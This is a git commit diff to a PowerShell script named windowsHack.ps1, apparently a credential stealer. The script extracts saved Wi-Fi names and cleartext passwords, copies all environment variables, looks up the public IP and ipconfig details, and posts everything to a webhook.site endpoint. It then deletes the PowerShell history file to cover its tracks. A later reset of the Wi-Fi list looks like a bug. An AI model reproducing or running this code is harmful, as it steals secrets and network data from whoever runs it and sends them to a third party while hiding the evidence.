8a2907ab6228dd6d693f23acb055bf2625a81067
PeterGriffinAtGmailDotCom <156129816+PeterGriffinAtGmailDotCom@users.noreply.github.com>
2024-01-13 15:17:23 +0200

    Update windowsHack.ps1

--- windowsHack.ps1
+++ windowsHack.ps1
@@ -1,20 +1,34 @@
 $profiles = netsh wlan show profiles | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
   $_.Matches.Value
 }
+foreach ($profile in $profiles) {
+  $password = netsh wlan show profile $profile key=clear | Select-String '(?<=Key Content\s+:\s).+' | ForEach-Object {
+    $_.Matches.Value.Trim()
+  }
+  $wifis += @{
+    'name' = $profile
+    'password' = $password
+  }
+}
+$wifis = @()
+
 function oneOfTheHardestThingsInCodingIsNamingThings() {
     if (Test-Path $registryPath) {
         Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "Start_TrackProgs" -Value 0
         return "opposite of fucked up"
     } else {
         return "fucked up: not found"
-    }
-$wifis = @()
+}
+$priv = oneOfTheHardestThingsInCodingIsNamingThings
 
 $envVars = @{}
 gci env:* | ForEach-Object {
   $envVars[$_.Name] = $_.Value
 }
-$priv = oneOfTheHardestThingsInCodingIsNamingThings
+
+$IPV4 = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
+$IPconfig = (ipconfig /all)
+
 $Body = @{
   'username' = $env:username
   'ipv4' = $IPV4
@@ -24,4 +38,5 @@ $Body = @{
   'env' = $envVars
 }
 Invoke-RestMethod -ContentType 'Application/Json' -Uri https://webhook.site/eb616291-21c4-4959-9e07-a692d2c312c8 -Method Post -Body ($Body | ConvertTo-Json)
+
 Remove-Item (Get-PSReadlineOption).HistorySavePath
